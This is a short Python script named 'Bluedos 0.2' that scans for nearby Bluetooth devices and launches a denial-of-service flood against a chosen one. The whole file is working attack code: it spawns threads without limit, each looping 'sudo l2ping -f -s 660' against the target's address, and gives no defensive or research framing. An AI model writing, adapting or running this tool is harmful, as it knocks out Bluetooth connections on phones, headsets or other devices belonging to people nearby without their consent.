# Bluedos 0.2 by @ceigh
import subprocess


def confirm(question):
    while 1:
        reply = input("%s (y/n): " % question).lower()
        if reply == 'n':
            return 0
        elif reply in ('y', ''):
            return 1


def bye():
    print("\nBye!")
    from time import sleep
    sleep(1)
    print("\033c")


def get_devices():
    print("Scanning...\n")
    if len(subprocess.check_output(['hcitool', 'dev']).decode()[9:]) > 0:
        hcitool_out = subprocess.check_output(['hcitool', 'scan']).decode()[13:-1]
        devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
        return devices
    else:
        exit("Enable BT first")


def attack(target):
    from threading import Thread

    def sp():
        while 1:
            subprocess.Popen(['sudo', 'l2ping', '-f', '-s', '660', target[0]],
                             stderr=subprocess.STDOUT,
                             stdout=subprocess.DEVNULL)

    print("Attacking '%s'...\nTo stop type Ctrl+C" % target[1])
    try:
        while 1:
            Thread(target=sp).start()
    except KeyboardInterrupt:
        bye()


def main():
    print("\033c")
    devices = get_devices()
    dev_number = len(devices)
    if dev_number == 0:
        print("No devices around :(")
        if confirm("Want to try again?"):
            main()
        else:
            bye()
    elif dev_number == 1:
        attack(devices[0])
    else:
        print("Several devices found:")
        for index, device in enumerate(devices):
            # print("%d) '%s' <%s>" % (dev, devices[dev][1], devices[dev][0]))
            print(f"{index}: '{device[1]}'\t{device[1]}")
        while 1:
            try:
                target_i = int(input("Select a device (0-%d): " % (dev_number - 1)))
            except ValueError:
                continue
            if target_i in range(dev_number):
                break
        attack(devices[target_i])


main()
